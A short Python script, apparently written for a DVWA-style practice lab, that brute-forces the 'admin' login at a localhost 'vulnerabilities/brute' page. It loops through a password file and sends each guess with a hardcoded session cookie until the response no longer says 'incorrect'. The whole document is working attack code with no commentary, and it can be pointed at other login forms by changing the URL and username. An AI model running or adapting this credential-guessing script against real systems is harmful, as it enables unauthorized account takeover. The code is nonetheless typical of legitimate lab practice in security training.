from pwn import *
import requests
import re

s = requests.Session()
p1 = log.progress("Password")

user='admin'

archivo = open("passwords.txt", "r")
pass_list = archivo.read().split("\n")
archivo.close()
cookie = {'PHPSESSID' : '69eb6e09lenp23n28il6su6th4',
            'security': 'medium'}

p2 = log.progress("result")
for password in pass_list:
    p1.status("trying: "+user+":"+password)
    try:
        r = s.post('http://localhost/vulnerabilities/brute/?username='+user+'&password='+password+'&Login=Login', cookies=cookie, timeout=1)
        found = r.text.find("incorrect")
        s.close()
        if found!=-1:
            p2.status('nada mano :\'v')
        else:
            p2.status('funco uwu')
            p2.success("Password: "+ user+":"+password)
            p1.success()
            break
    except:
        s.close()
        p2.status('nada mano :\'v')